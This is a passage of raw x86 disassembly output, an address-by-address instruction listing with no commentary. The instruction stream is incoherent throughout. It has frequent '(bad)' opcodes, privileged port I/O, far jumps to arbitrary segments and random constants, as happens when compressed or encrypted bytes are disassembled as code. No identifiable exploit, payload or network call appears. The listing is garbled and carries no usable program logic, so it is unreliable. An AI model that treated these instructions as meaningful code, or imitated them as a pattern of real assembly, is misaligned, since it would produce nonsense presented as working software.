  41772f:	sub    ebx,DWORD PTR [edx+0x3d]
  417732:	add    DWORD PTR [ecx-0x568a5c35],ecx
  417738:	(bad)  
  417739:	mov    ebp,0x5656dd34
  41773e:	xor    BYTE PTR [ecx-0x6855ca6a],ah
  417744:	shr    DWORD PTR [edi+0x5b12db8e],0xb2
  41774b:	call   0x5b52c0de
  417750:	popf   
  417751:	ss pop ebx
  417753:	std    
  417754:	out    dx,al
  417755:	cmp    esp,ebx
  417757:	pushf  
  417758:	jp     0x417787
  41775a:	out    dx,al
  41775b:	std    
  41775c:	jmp    0x417722
  41775e:	xchg   edx,eax
  41775f:	in     al,0xdb
  417761:	inc    ebx
  417762:	(bad)  
  417763:	gs or  ebp,esi
  417766:	out    dx,eax
  417767:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417768:	loope  0x417752
  41776a:	int    0xde
  41776c:	cmp    DWORD PTR [edx-0x47c34204],ebx
  417772:	or     DWORD PTR [edi],esi
  417774:	cmp    dh,BYTE PTR [eax]
  417776:	outs   dx,DWORD PTR ds:[esi]
  417777:	pop    eax
  417778:	es mov esp,0xb89b571a
  41777e:	pop    edi
  41777f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417780:	mov    eax,0xac224a8
  417785:	not    BYTE PTR [ecx+0xb0f9bf3]
  41778b:	or     ebp,esi
  41778d:	mul    BYTE PTR [eax+esi*1]
  417790:	mov    dl,0xe1
  417792:	pop    ecx
  417793:	into   
  417794:	aad    0x72
  417796:	xor    BYTE PTR [edi-0x106d4a65],dl
  41779c:	adc    eax,0x210ce386
  4177a1:	mov    al,ds:0xe8c3198a
  4177a6:	push   ebp
  4177a7:	adc    DWORD PTR [ebx-0x3c],edx
  4177aa:	or     eax,0xba43a5e6
  4177af:	out    dx,al
  4177b0:	(bad)  
  4177b1:	sbb    eax,0x723d3a1e
  4177b6:	inc    eax
  4177b7:	fsubr  QWORD PTR ss:[ecx]
  4177ba:	loop   0x41777f
  4177bc:	jl     0x417799
  4177be:	jg     0x417803
  4177c0:	ds push esp
  4177c2:	dec    esp
  4177c3:	popa   
  4177c4:	pop    ecx
  4177c5:	imul   esp,DWORD PTR [edx+0x2b],0xa84b38dc
  4177cc:	repz in al,dx
  4177ce:	ror    DWORD PTR [ebx+0x27],0x82
  4177d2:	outs   dx,WORD PTR ds:[esi]
  4177d4:	in     al,dx
  4177d5:	sar    esi,1
  4177d7:	jp     0x417792
  4177d9:	stos   BYTE PTR es:[edi],al
  4177da:	or     dh,ch
  4177dc:	das    
  4177dd:	call   0x5b29:0xa87fde2d
  4177e4:	inc    esi
  4177e5:	fsub   DWORD PTR [eax+edx*8]
  4177e8:	outs   dx,BYTE PTR ds:[esi]
  4177e9:	imul   esp,DWORD PTR ds:0xb1a2bc19,0xffffffb0
  4177f0:	and    esi,DWORD PTR [ebp-0x1c]
  4177f3:	ds cmc 
  4177f5:	xor    DWORD PTR [ebx-0x7d],esi
  4177f8:	add    bh,bl
  4177fa:	pop    es
  4177fb:	pop    ebx
  4177fc:	ds mov bl,dl
  4177ff:	out    dx,al
  417800:	mov    dh,0x1c
  417802:	sbb    dl,BYTE PTR [ebp+0x58]
  417805:	retf   0x77bb
  417808:	je     0x417842
  41780a:	fstp   TBYTE PTR [eax+0x74]
  41780d:	adc    bh,BYTE PTR [ebp+eax*2-0x5b]
  417811:	js     0x4177a9
  417813:	pop    esi
  417814:	retf   0x3cfe
  417817:	(bad)  
  417819:	outs   dx,BYTE PTR ds:[esi]
  41781a:	fs inc esp
  41781c:	mov    edx,0x873eac1
  417821:	jmp    0x7c119b4
  417826:	test   DWORD PTR [esi+0x30f3c674],esi
  41782c:	mov    esp,DWORD PTR [eax+ecx*8]
  41782f:	jl     0x417871
  417831:	and    eax,0x53d70988
  417836:	pop    esp
  417837:	cmp    DWORD PTR [ecx+0xd74d318],eax
  41783d:	mov    esi,0xe7bc05a
  417842:	hlt    
  417843:	pop    ds
  417844:	pushaw 
  417846:	xor    ebp,DWORD PTR [eax]
  417848:	xor    edi,ebp
  41784a:	jmp    0xc41d:0x49c7f316
  417851:	jmp    0x417885
  417853:	scas   al,BYTE PTR es:[edi]
  417854:	mov    ds:0xdbb6ee2c,eax
  417859:	mov    WORD PTR [ecx],ss
  41785b:	ret    0x2055
  41785e:	pop    ecx
  41785f:	test   al,0x74
  417861:	xor    BYTE PTR [esi],ah
  417863:	inc    ecx
  417864:	jmp    0x51df:0xa7d7a9b0
  41786b:	or     al,0x94
  41786d:	aam    0x77
  41786f:	mov    esp,0xe918bfba
  417874:	dec    esp
  417875:	sub    al,0x52
  417877:	in     al,0xcf
  417879:	cmc    
  41787a:	das    
  41787b:	sbb    al,0xc6
  41787d:	pop    ebp
  41787e:	sub    al,0x29
  417880:	or     ebx,DWORD PTR [edx+edi*2]
  417883:	outs   dx,DWORD PTR ds:[esi]
  417884:	stc    
  417885:	mov    esp,DWORD PTR [ebp+0x17c312a5]
  41788b:	push   ebx
  41788c:	push   ebp
  41788d:	pop    ds
  41788e:	xchg   ecx,eax
  41788f:	or     DWORD PTR [edx],ebx
  417891:	inc    edx
  417892:	pop    ecx
  417893:	cmc    
  417894:	ds dec ebx
  417896:	das    
  417897:	jmp    0xf7cd:0xd6d75788
  41789e:	pop    esi
  41789f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4178a0:	cmp    DWORD PTR [ebx-0x5479062b],ebx
  4178a6:	fsubr  st(3),st
  4178a8:	pop    eax
  4178a9:	xor    al,0xd6
  4178ab:	jg     0x417890
  4178ad:	stc    
  4178ae:	xor    DWORD PTR [edx],esp
  4178b0:	scas   eax,DWORD PTR es:[edi]
  4178b1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4178b2:	xchg   esi,eax
  4178b3:	push   cs
  4178b4:	pop    eax
  4178b5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4178b6:	sub    eax,0x4e19dbab
  4178bb:	cmp    bh,BYTE PTR [edi-0x7e4e1600]
  4178c1:	push   edx
  4178c2:	adc    eax,0xda7cb368
  4178c7:	stos   BYTE PTR es:[edi],al
  4178c8:	test   al,0x1
  4178ca:	xor    bh,ah
  4178cc:	push   0x4
  4178ce:	jp     0x417901
  4178d0:	jge    0x41794e
  4178d2:	jge    0x41788a
  4178d4:	addr16 out dx,eax
  4178d6:	das    
  4178d7:	fcmovb st,st(5)
  4178d9:	(bad)  
  4178da:	push   esp
  4178db:	test   BYTE PTR [ebp+0x15],0xf3
  4178df:	xor    al,0x27
  4178e1:	dec    ebx
  4178e2:	or     DWORD PTR [ebx],ecx
  4178e4:	xchg   edx,eax
  4178e5:	xchg   esi,eax
  4178e6:	inc    ebx
  4178e7:	out    0xe7,eax
  4178e9:	stos   DWORD PTR es:[edi],eax
  4178ea:	jl     0x4178fa
  4178ec:	push   edx
  4178ed:	lds    esp,FWORD PTR [esi]
  4178ef:	xlat   BYTE PTR ds:[ebx]
  4178f0:	sbb    dl,bl
  4178f2:	sti    
  4178f3:	ins    DWORD PTR es:[edi],dx
  4178f4:	xchg   ecx,eax
  4178f5:	ins    BYTE PTR es:[edi],dx
  4178f6:	repnz out dx,al
  4178f8:	addr16 pop esi
  4178fa:	push   eax
  4178fb:	lock add BYTE PTR [ebx+0x64],dh
  4178ff:	leave  
  417900:	cmp    ch,dl
  417902:	call   FWORD PTR [eax]
  417904:	push   0xa1d76d25
  417909:	fst    QWORD PTR [edx]
  41790b:	retf   0xfdb1
  41790e:	shl    DWORD PTR [ecx-0xb459764],1
  417914:	rcl    eax,cl
  417916:	mov    cs,WORD PTR fs:[edi+ebx*2+0x5f891b80]
  41791e:	jb     0x417961
  417920:	push   esp
  417921:	bound  ebp,QWORD PTR [ebp-0x54e7d6ed]
  417927:	ret    0x443c
  41792a:	xor    BYTE PTR [eax],0xea
  41792d:	cwde   
  41792e:	cmp    DWORD PTR [ecx+0x70],eax
  417931:	or     dl,BYTE PTR [ebp-0x50]
  417934:	mov    eax,ds:0x76381aa9
  417939:	loope  0x417912
  41793b:	pop    ebx
  41793c:	fiadd  DWORD PTR [edi+ebx*8]
  41793f:	xchg   esp,eax
  417940:	lock xor ah,dl
  417943:	popa   
  417944:	inc    eax
  417945:	jo     0x417951
  417947:	or     ebp,DWORD PTR [ecx]
  417949:	dec    ebx
  41794a:	mov    ebp,0x935a7002
  41794f:	fcomp  DWORD PTR [edx]
  417951:	ret    
  417952:	leave  
  417953:	int    0x59
  417955:	fcomp  QWORD PTR [edx-0x2f99eb90]
  41795b:	jmp    0x4a68:0xfcb3d467
  417962:	cmp    DWORD PTR [eax],esi
  417964:	sbb    al,0xf5
  417966:	cld    
  417967:	in     al,0x1d
  417969:	or     esp,ecx
  41796b:	out    dx,al
  41796c:	repz retf 0x9e8c
  417970:	or     ch,BYTE PTR [ebp-0x20]
  417973:	sbb    ah,ch
  417975:	mov    eax,0x47b99cc
  41797a:	mov    DWORD PTR [ecx+0x5bb4bba3],esp
  417980:	jne    0x417961
  417982:	xor    al,0x53
  417984:	test   al,0xe4
  417986:	pop    es
  417987:	adc    DWORD PTR [ebp+esi*1-0x4c968301],edi
  41798e:	test   BYTE PTR [esi-0x80],0xe1
  417992:	(bad)  
  417993:	repz jmp 0x663f4cee
  417999:	(bad)  
  41799a:	jne    0x4179d0
  41799c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41799d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41799e:	xchg   edi,eax
  41799f:	sub    edi,DWORD PTR [ecx-0x5c]
  4179a2:	cwde   
  4179a3:	jbe    0x417950
  4179a5:	test   eax,0x918ae2b7
  4179aa:	jno    0x417966
  4179ac:	add    DWORD PTR [esi+0x23341f9e],eax
  4179b2:	outs   dx,DWORD PTR ds:[esi]
  4179b3:	aad    0x57
  4179b5:	and    DWORD PTR [eax-0x3f4b19f9],ecx
  4179bb:	pop    esp
  4179bc:	mov    eax,ds:0x7f0b149
  4179c1:	jmp    0xf8a4a9a3
  4179c6:	mov    esp,0x4b9790cb
  4179cb:	fnstsw WORD PTR [ebx+0x50]
  4179ce:	and    esp,DWORD PTR [eax+0x6abdfd12]
  4179d4:	pop    edi
  4179d5:	stc    
  4179d6:	aam    0x32
  4179d8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4179d9:	inc    ebp
  4179da:	ins    DWORD PTR es:[edi],dx
  4179db:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4179dc:	in     eax,dx
  4179dd:	inc    ebp
  4179de:	add    edx,0x18
  4179e1:	aam    0x43
  4179e3:	fwait
  4179e4:	in     eax,dx
  4179e5:	shl    BYTE PTR [ecx+0x19],0xed
  4179e9:	out    0x59,eax
  4179eb:	ja     0x417a31
  4179ed:	inc    ecx
  4179ee:	or     eax,0x8a3f2128
  4179f3:	lds    esp,FWORD PTR [edi+edx*1-0x76]
  4179f7:	dec    ebp
  4179f8:	dec    esi
  4179f9:	cmc    
  4179fa:	in     al,0x88
  4179fc:	icebp  
  4179fd:	aam    0x69
  4179ff:	adc    edx,0x114c464c
  417a05:	mov    eax,0x788a3408
  417a0a:	jae    0x4179e5
  417a0c:	dec    eax
  417a0d:	mov    BYTE PTR [ebx],ch
  417a0f:	mov    ds:0x10289ca2,al
  417a14:	push   0x11
  417a16:	fidiv  DWORD PTR [ecx]
  417a18:	mov    cs,ebp
  417a1a:	dec    esp
  417a1b:	rcr    DWORD PTR [eax+edi*2-0x59],0xb8
  417a20:	push   esi
  417a21:	dec    esi
  417a22:	sub    eax,0x890a82f2
  417a27:	adc    ebx,DWORD PTR ds:0x435e3d80
  417a2d:	out    dx,al
  417a2e:	es (bad) 
  417a30:	out    0x2d,eax
  417a32:	mov    BYTE PTR [esi],ch
  417a34:	inc    ebx
  417a36:	inc    ecx
  417a37:	loopne 0x417a94
  417a39:	fld    TBYTE PTR [ebx]
  417a3b:	sbb    DWORD PTR [edx],0xffffffb5
  417a3e:	test   DWORD PTR [edx+ebx*1-0x4c],eax
  417a42:	mov    eax,0x4490aaf9
  417a47:	push   ds
  417a48:	xor    edi,0x69
  417a4b:	jo     0x417a61
  417a4d:	pop    es
  417a4e:	cld    
  417a4f:	sub    ch,BYTE PTR [eax-0x35]
  417a52:	push   ebp
  417a53:	call   0x68157a17
  417a58:	test   ebx,ebx
  417a5a:	and    ah,BYTE PTR [ebp+0x3da80868]
  417a60:	inc    edi
  417a61:	fucomi st,st(4)
  417a63:	cmp    eax,0xa496df76
  417a68:	xchg   ebx,eax
  417a69:	mov    bl,BYTE PTR [edi+0xbbba4df]
  417a6f:	mov    eax,0xa04fad41
  417a74:	xchg   esi,eax
  417a75:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417a76:	fldcw  WORD PTR [eax-0x42]
  417a79:	xlat   BYTE PTR ds:[ebx]
  417a7a:	cmp    al,0x77
  417a7c:	mov    eax,0xb94984cb
  417a81:	or     cl,BYTE PTR [edx+0x7c]
  417a84:	ffree  st(3)
  417a86:	popa   
  417a87:	dec    eax
  417a88:	jl     0x417a69
  417a8a:	sbb    dh,BYTE PTR [edx]
  417a8c:	mov    DWORD PTR [edx-0x21c129ec],ebx
  417a92:	jmp    0xa8a06fdc
  417a97:	test   BYTE PTR [esi+0x6b],dh
  417a9a:	xchg   BYTE PTR fs:[edx+0x41e013c1],bh
  417aa1:	cdq    
  417aa2:	ficom  DWORD PTR [ebx+eiz*2+0x44]
  417aa6:	and    eax,0x3b7e518c
  417aab:	loopne 0x417a9c
  417aad:	loop   0x417ae4
  417aaf:	sti    
  417ab0:	fsub   QWORD PTR [edx+0x69a2a1d2]
  417ab6:	mov    edx,0xe7117fe4
  417abb:	xor    BYTE PTR [esi+0x21153aa2],dl
  417ac1:	loope  0x417aaa
  417ac3:	mov    al,ds:0xfe635da1
  417ac8:	jg     0x417b49
  417aca:	inc    ebx
  417acb:	enter  0x2c1b,0x5c
  417acf:	mov    esi,0xae7a6083
  417ad4:	fstp   TBYTE PTR ds:[edi-0x3b51e719]
  417adb:	fdivp  st(6),st
  417add:	inc    edi
  417ade:	jns    0x417b02
  417ae0:	xchg   esi,eax
  417ae1:	xlat   BYTE PTR ds:[ebx]
  417ae2:	inc    ebx
  417ae3:	arpl   WORD PTR [ebp+0x6],cx
  417ae6:	sbb    al,0xec
  417ae8:	(bad)  
  417ae9:	clc    
  417aea:	mov    DWORD PTR [esi+0x7b],esi
  417aed:	fsubrp st(5),st
  417aef:	aad    0x51
  417af1:	stos   DWORD PTR es:[edi],eax
  417af2:	out    dx,eax
  417af3:	mov    BYTE PTR ds:0x8a5260a5,bl
  417af9:	fcmovne st,st(1)
  417afb:	jecxz  0x417aee
  417afd:	xchg   ecx,eax
  417afe:	mov    ch,0x36
  417b00:	xchg   ecx,eax
  417b01:	sub    eax,0x460aeb59
  417b06:	adc    edi,esp
  417b08:	mov    al,0x26
  417b0a:	loope  0x417ad5
  417b0c:	xor    bh,dl
  417b0e:	sub    BYTE PTR [edx],cl
  417b10:	xchg   DWORD PTR [eax-0x57],ebx
  417b13:	shr    BYTE PTR [edi+ecx*4-0x5],0x2c
  417b18:	lods   eax,DWORD PTR ds:[esi]
  417b19:	or     eax,0x4c9b5f3d
  417b1e:	ds adc ah,dl
  417b21:	scas   eax,DWORD PTR es:[edi]
  417b22:	sub    eax,0x9d616a51
  417b27:	(bad)  
  417b28:	xchg   edx,eax
  417b29:	push   0x6c
  417b2b:	push   ebx
  417b2c:	js     0x417ba6
  417b2e:	mov    ebp,0x1ea856a5
  417b33:	bound  edi,QWORD PTR [edx+0x50eaa9fa]
  417b39:	retf   
  417b3a:	inc    ecx
  417b3b:	fist   WORD PTR [edx+0x5]
  417b3e:	and    DWORD PTR [esi+edx*1-0x41b59adb],ecx
  417b45:	iret   
  417b46:	mov    bl,0x78
  417b48:	cmovne ebx,eax
  417b4b:	daa    
  417b4c:	lds    ecx,FWORD PTR [edx+esi*1]
  417b4f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417b50:	mov    ch,0xff
  417b52:	lds    esi,FWORD PTR [ebp-0x3a]
  417b55:	gs jmp 0xbb78:0xbfb6c4c
  417b5d:	fcom   QWORD PTR [edx+0x5d8b60e3]
  417b63:	addr16 xchg edx,eax
  417b65:	add    DWORD PTR [edx+0x16],0x2b5da491
  417b6c:	jb     0x417ba0
  417b6e:	jne    0x417b26
  417b70:	sbb    eax,0xd5b066b0
  417b75:	shl    DWORD PTR gs:0xd2e4e38b,cl
  417b7c:	mov    edx,0x28190692
  417b81:	push   ebx
  417b82:	xchg   DWORD PTR [ecx+0x10],edi
  417b85:	shl    BYTE PTR [ebx+0x4d],0xda
  417b89:	inc    ebx
  417b8a:	lds    eax,FWORD PTR [ecx+0x20]
  417b8d:	mov    ecx,0x2a923f1a
  417b92:	aas    
  417b93:	imul   ecx,DWORD PTR [ecx],0x78
  417b96:	aas    
  417b97:	mov    ds:0x34024c99,al
  417b9c:	sbb    eax,ecx
  417b9e:	fcom   QWORD PTR [edi-0x10]
  417ba1:	shl    esp,0xe0
  417ba4:	jne    0x417bcc
  417ba6:	add    DWORD PTR [eax],ebx
  417ba8:	mov    al,ds:0xc6bbaec0
  417bad:	enter  0xfe33,0xc1
  417bb1:	mov    ah,0x25
  417bb3:	ins    BYTE PTR es:[edi],dx
  417bb4:	in     al,dx
  417bb5:	mov    bh,0xae
  417bb7:	(bad)  [eax-0x3117483c]
  417bbd:	mov    al,0xb5
  417bbf:	mov    eax,ds:0x7f882632
  417bc4:	push   0x31
  417bc6:	mov    DWORD PTR [ebp+0x20],edi
  417bc9:	add    bl,BYTE PTR [ecx-0x1a]
  417bcc:	mov    esi,0x570dd4be
  417bd1:	mov    eax,0xaa0b2c72
  417bd6:	rcl    BYTE PTR [eax-0x68cb2f63],1
  417bdc:	xchg   edi,eax
  417bdd:	outs   dx,DWORD PTR ds:[esi]
  417bde:	cmp    al,0x8f
  417be0:	fistp  DWORD PTR [eax-0x29]
  417be3:	mov    cl,0xda
  417be5:	xor    BYTE PTR [edi+0x34],ch
  417be8:	int    0xd1
  417bea:	mov    ah,0x6
  417bec:	pop    ebp
  417bed:	inc    ebp
  417bee:	inc    edx
  417bef:	jp     0x417c3b
  417bf1:	sub    DWORD PTR [ecx-0x9],edi
  417bf4:	pop    eax
  417bf5:	test   al,0x8b
  417bf7:	xchg   ebx,eax
  417bf8:	and    BYTE PTR [ecx-0x3f23830e],0x73
  417bff:	ss (bad) 
  417c01:	cmp    al,0x4
  417c03:	je     0x417c04
  417c05:	adc    cl,BYTE PTR [edx]
  417c07:	xchg   esp,eax
  417c08:	xchg   esp,ecx
  417c0a:	leave  
  417c0b:	xchg   ebp,eax
  417c0d:	add    eax,0xe8a946d5
  417c12:	mov    ch,0x22
  417c14:	xlat   BYTE PTR ds:[ebx]
  417c15:	or     ebx,DWORD PTR [ecx+0x363843a6]
  417c1b:	daa    
  417c1c:	mov    edi,0x528a3d42
  417c21:	inc    edx
  417c22:	enter  0x25c3,0xb6
  417c26:	pcmpeqb mm0,QWORD PTR [ebx+esi*8-0x1fc9ba17]
  417c2e:	fst    DWORD PTR [ebx+0x4a]
  417c31:	sub    BYTE PTR [esi],bl
  417c33:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417c34:	and    ebp,edi
  417c36:	xchg   ebp,eax
  417c37:	dec    esi
  417c38:	(bad)  
  417c39:	xor    BYTE PTR [eax],0xbf
  417c3c:	les    ebx,FWORD PTR [esp+ebp*4+0x6f27a31]
  417c43:	out    0x20,eax
  417c45:	xor    al,0x42
  417c47:	gs push 0x36b3de64
  417c4d:	pop    ecx
  417c4e:	sub    DWORD PTR [ebx+ecx*1-0x20786211],ebp
  417c55:	in     al,dx
  417c56:	(bad)
  417c5a:	sub    dl,al
  417c5c:	ins    BYTE PTR es:[edi],dx
  417c5d:	psllw  mm5,QWORD PTR [ecx+0xdee8f2b]
  417c64:	jo     0x417c6e
  417c66:	mov    bh,0xb3
  417c68:	iret   
  417c69:	fld    DWORD PTR [ebp-0x6eae8ab]
  417c6f:	imul   eax,DWORD PTR [eax+0x5e],0xffffffad
  417c73:	cld    
  417c74:	jle    0x417c95
  417c76:	aam    0x7c
  417c78:	push   ebp
  417c79:	cmp    esi,eax
  417c7b:	mov    cl,BYTE PTR [ebp+esi*2-0x60]
  417c7f:	(bad)  
  417c80:	mov    ds:0x37b11f55,eax
  417c85:	dec    esp
  417c86:	sbb    eax,0x8a5e87c5
  417c8b:	push   edx
  417c8c:	sub    al,0x14
  417c8e:	adc    al,0xdc
  417c90:	xchg   edi,eax
  417c91:	cmp    al,0x71
  417c93:	in     eax,dx
  417c94:	outs   dx,DWORD PTR ds:[esi]
  417c95:	inc    BYTE PTR [ebp+0xb8a6704]
  417c9b:	or     BYTE PTR [ebx],ah
  417c9d:	pop    es
  417c9e:	fadd   QWORD PTR [eax+0x1c]
  417ca1:	es repz or al,0xad
  417ca5:	inc    ebp
  417ca6:	dec    ebx
  417ca7:	jp     0x417c62
  417ca9:	pop    ss
  417caa:	sub    al,0x10
  417cac:	pop    ebx
  417cad:	sub    edx,DWORD PTR [eax-0x1849d729]
  417cb3:	dec    esi
  417cb4:	loope  0x417c40
  417cb6:	or     BYTE PTR [edi+eax*2],ch
  417cb9:	mov    BYTE PTR [ebx+eiz*4-0xc795a4c],bh
  417cc0:	sbb    ebp,DWORD PTR [ecx-0x45d63b7c]
  417cc6:	mov    ds:0xdf4749c8,al
  417ccb:	gs mov ebp,0xac2d4679
  417cd1:	fwait
  417cd2:	cmc    
  417cd3:	fdivr  QWORD PTR [ecx+0x69]
  417cd6:	pop    edx
  417cd7:	in     al,0x43
  417cd9:	jno    0x417cc9
  417cdb:	inc    ebp
  417cdc:	repz aad 0x6a
  417cdf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417ce0:	or     DWORD PTR [ecx+ebp*2],edi
  417ce3:	sub    ebx,DWORD PTR [eax-0x10]
  417ce6:	jmp    0x518410d8
  417ceb:	jne    0x417d44
  417ced:	mov    ds:0x94db5c55,eax
  417cf2:	pop    es
  417cf3:	sbb    esp,DWORD PTR [eax+0x39]
  417cf6:	pop    ecx
  417cf7:	imul   ecx,DWORD PTR [eax],0x2
  417cfa:	push   edx
  417cfb:	ret    
  417cfc:	inc    ebx
  417cfd:	fst    DWORD PTR [esi+0x5530f191]
  417d03:	mov    cl,0xa2
  417d05:	imul   eax,edx,0x2
  417d08:	push   ecx
  417d09:	add    DWORD PTR [esi],eax
  417d0b:	dec    esi
  417d0c:	(bad)  
  417d0d:	leave  
  417d0e:	std    
  417d0f:	pop    esi
  417d10:	addr16 test eax,0x68aac3f
  417d16:	arpl   WORD PTR ds:0x2b9cb35a,si
  417d1c:	ret    0x6fbe
  417d1f:	fbld   TBYTE PTR [ebp+0x6851925a]
  417d25:	cmp    bh,BYTE PTR [esi+edi*4-0x1aed7291]
  417d2c:	cmc    
  417d2d:	in     al,0x6f
  417d2f:	inc    edi
  417d30:	or     al,0x1b
  417d32:	sub    edx,DWORD PTR [edi]
  417d34:	cli    
  417d35:	cld    
  417d36:	ret    0xd90e
  417d39:	adc    eax,0x4e63262a
  417d3e:	mov    eax,ds:0xb47f55b3
  417d43:	inc    esp
  417d44:	std    
  417d45:	push   es
  417d46:	mov    dh,0x46
  417d48:	cwde   
  417d49:	adc    eax,0xa6fda365
  417d4e:	cmp    esi,DWORD PTR [ebp-0x19b8bdee]
  417d54:	xor    BYTE PTR [edi],dl
  417d56:	xchg   BYTE PTR [eax+0x47],bl
  417d59:	sbb    eax,0x9e5bd8ad
  417d5e:	hlt    
  417d5f:	sbb    BYTE PTR [ebx],ah
  417d61:	mov    esi,0x63c74c5a
  417d66:	cs jo  0x417d50
  417d69:	xchg   cl,dh
  417d6b:	(bad)  
  417d6d:	xchg   ebp,eax
  417d6e:	fstp   QWORD PTR ds:0xc88656bc
  417d74:	pop    ecx
  417d75:	xchg   edi,eax
  417d76:	into   
  417d77:	push   ecx
  417d78:	jmp    0x417d3e
  417d7a:	hlt    
  417d7b:	inc    esi
  417d7c:	xor    al,0x68
  417d7e:	mov    esi,0x1c251e93
  417d83:	call   0x1aba82b5
  417d88:	sbb    eax,0xb92c7647
  417d8d:	pop    edi
  417d8e:	jecxz  0x417d46
  417d90:	outs   dx,DWORD PTR ds:[esi]
  417d91:	shr    esi,0x42
  417d94:	sar    ebp,cl
  417d96:	shr    DWORD PTR [edi],0x9e
  417d99:	call   0x706c8c47
  417d9e:	mov    eax,0x43989f8d
  417da3:	and    BYTE PTR [edx],ah
  417da5:	xchg   ecx,eax
  417da6:	mov    esi,0xd8d03731
  417dab:	in     al,0xa8
  417dad:	ror    eax,cl
  417daf:	in     eax,0x7a
  417db1:	jg     0x417d4b
  417db3:	ror    eax,1
  417db5:	jmp    0xc53a3043
  417dba:	out    0x2d,al
  417dbc:	or     eax,0xda66675
  417dc1:	inc    esi
  417dc2:	push   ebx
  417dc3:	pop    edi
  417dc4:	je     0x417df5
  417dc6:	js     0x417d68
  417dc8:	mov    ch,0x34
  417dca:	push   ds
  417dcb:	ja     0x417e0f
  417dcd:	ds into 
  417dcf:	fistp  DWORD PTR [ebp-0x1d]
  417dd2:	add    BYTE PTR [esi-0x9],al
  417dd5:	mov    edx,0xf6491b13
  417dda:	adc    ecx,DWORD PTR [edx]
  417ddc:	das    
  417ddd:	nop
  417dde:	sbb    ah,BYTE PTR [ecx-0x71892e73]
  417de4:	and    ebp,DWORD PTR [esi+0x6]
  417de7:	dec    eax
  417de8:	call   0xcd589dcf
  417ded:	cld    
  417dee:	ret    
  417def:	ficomp WORD PTR ds:0xf02bd7f
  417df5:	pop    ebx
  417df6:	push   edx
  417df7:	(bad)  
  417df8:	mov    edi,0x94843487
  417dfd:	sahf   
  417dfe:	popf   
  417dff:	std    
  417e00:	dec    edi
  417e01:	outs   dx,WORD PTR ds:[esi]
  417e03:	inc    ecx
  417e04:	and    DWORD PTR [ebp+0x2289e29e],ebx
  417e0a:	inc    DWORD PTR [esi+0x53c91013]
  417e10:	jns    0x417e00
  417e12:	or     al,0xc7
  417e14:	jle    0x417e31
  417e16:	scas   eax,DWORD PTR es:[edi]
  417e17:	in     eax,0x65
  417e19:	adc    dl,BYTE PTR [eax+0xc]
  417e1c:	leave  
  417e1d:	scas   al,BYTE PTR es:[edi]
  417e1e:	sub    eax,0x7b0e11df
  417e23:	neg    DWORD PTR [edi]
  417e25:	jmp    0x4906:0x37b55df9
  417e2c:	nop
  417e2d:	(bad)  [ebx]
  417e2f:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417e31:	not    BYTE PTR ss:[eax-0x78]
  417e35:	das    
  417e36:	out    0x10,al
  417e38:	lods   al,BYTE PTR ds:[esi]
  417e39:	push   ss
  417e3a:	dec    edx
  417e3b:	pop    ebp
  417e3c:	add    esp,eax
  417e3e:	fwait
  417e3f:	jmp    0x417de2
  417e41:	mov    ah,BYTE PTR [eax-0x57]
  417e44:	cmp    al,0x37
  417e46:	hlt    
  417e47:	daa    
  417e48:	sbb    eax,edx
  417e4a:	std    
  417e4b:	and    ebx,DWORD PTR [ebp-0x49470369]
  417e51:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417e52:	push   ds
  417e53:	ss add al,0xb3
  417e56:	addr16 int3 
  417e58:	out    dx,eax
  417e59:	dec    edi
  417e5a:	icebp  
  417e5b:	fld    QWORD PTR [edx+0x67]
  417e5e:	jmp    0xe8ce:0x5a356722
  417e65:	jecxz  0x417e63
  417e67:	mov    ch,0xfb
  417e69:	sbb    edx,DWORD PTR [ebp+0x60]
  417e6c:	int    0x84
  417e6e:	jl     0x417e70
  417e70:	neg    esp
  417e72:	mov    edx,0xe7ebe5a7
  417e77:	bound  ecx,QWORD PTR [eax+0x62]
  417e7a:	fwait
  417e7b:	cdq    
  417e7c:	push   0x1c9024a5
  417e81:	loop   0x417e69
  417e83:	cmp    BYTE PTR [eax+0x5df5cb02],al
  417e89:	dec    ebx
  417e8a:	jb     0x417e7c
  417e8c:	jg     0x417edc
  417e8e:	stos   DWORD PTR es:[edi],eax
  417e8f:	inc    edi
  417e90:	mov    edi,0xaac6f824
  417e95:	pop    ebp
  417e96:	pop    esi
  417e97:	or     eax,0x8977f2f9
  417e9c:	(bad)  
  417e9d:	stc    
  417e9e:	sbb    cl,BYTE PTR [edi+0x75]
  417ea1:	repz adc edx,DWORD PTR [edx+0x22]
  417ea5:	jge    0x50c375e1
  417eab:	or     BYTE PTR [eax],bh
  417ead:	fadd   DWORD PTR [esi]
  417eaf:	cli    
  417eb0:	scas   eax,DWORD PTR es:[edi]
  417eb1:	bound  ebp,QWORD PTR [eax+0x19]
  417eb4:	sub    eax,0x45906cc2
  417eb9:	xchg   edi,eax
  417eba:	fstp   TBYTE PTR [edx-0x62]
  417ebd:	fst    DWORD PTR [ecx]
  417ebf:	pop    esi
  417ec0:	inc    DWORD PTR [esi+0x7cef926d]
  417ec6:	pop    eax
  417ec7:	repnz lahf 
  417ec9:	es mov cl,0x67
  417ecc:	in     al,0x11
  417ece:	les    ebp,FWORD PTR [esi]
  417ed0:	mov    al,ds:0x98476f7a
  417ed5:	cwde   
  417ed6:	fnstsw WORD PTR [ebx]
  417ed8:	psubd  mm1,mm1
  417edb:	and    al,0xa0
  417edd:	mov    ch,0xed
  417edf:	mov    bh,0x54
  417ee1:	xlat   BYTE PTR ds:[ebx]
  417ee2:	add    eax,0x641b89a6
  417ee7:	aad    0x90
  417ee9:	jmp    0x9b72:0xffb6cd98
  417ef0:	aad    0x7d
  417ef2:	dec    ebp
  417ef3:	out    dx,eax
  417ef4:	inc    ebp
